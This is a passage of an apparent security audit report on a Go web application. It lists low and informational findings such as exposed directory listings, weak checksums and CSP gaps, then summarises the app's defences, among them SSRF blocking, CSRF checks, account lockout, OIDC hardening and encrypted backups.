| L-15 | LOW | Availability | No graceful shutdown — os.Exit(0) in admin restart handler |
| L-16 | LOW | InfoLeak | Static directory listings exposed via http.FileServer |
| I-01 | INFO | Crypto | MD5/SHA-1 used for attachment checksums |
| I-02 | INFO | Config | SkipVerify in LDAP config |
| I-03 | INFO | AuthN | Open registration auto-vets users |
| I-04 | INFO | Headers | unsafe-inline in style-src CSP |
| I-05 | INFO | DoS | Multipart form size limits vary |
| I-06 | INFO | Crypto | Backup encryption tied to admin password |
| I-07 | INFO | Headers | CSP conflicts with inline scripts in popup HTML files |
| I-08 | INFO | Config | requireAPIKeyOrAuth middleware defined but never wired |

---

## What the Application Does Well

The codebase demonstrates strong security awareness:

- **Atomic file writes**: `saveJSON` uses write-to-temp then rename — prevents corruption on crash
- **SSRF-safe transport**: Webhooks and reference fetches use DNS-resolution-based blocking with `newSSRFSafeTransport`
- **X-Forwarded-For trust scoping**: `clientIP` only trusts proxy headers from private/loopback addresses
- **CSRF protection**: X-Requested-With header check on all state-changing requests in `requireAuth`, including login
- **Progressive account lockout**: 5→15min, 10→1hr, 20→4hr with reset on success
- **OIDC hardening**: PKCE, nonce, state parameter, `alg: none` rejection, JWKS verification for RSA/EC/PSS
- **XSS prevention**: `stripHTMLTags` on event fields, strong CSP with `script-src 'self'`
- **Body size limits**: 1MB JSON, bounded file uploads
- **Timing-safe comparisons**: Used for sessions, tokens, OIDC state, invitation codes
- **Dummy bcrypt on unknown users**: Prevents user enumeration via login timing
- **Random admin password**: Generated on first run with forced change
- **Secure cookie defaults**: HttpOnly, SameSite=Lax, Secure when HTTPS
- **Security headers**: X-Frame-Options DENY, HSTS, X-Content-Type-Options nosniff, Referrer-Policy
- **Backup encryption**: AES-256-GCM with PBKDF2-derived key
- **Path traversal prevention**: `filepath.Base` used consistently on user-supplied filenames
- **LDAP filter escaping**: `escapeLDAPFilter` prevents injection
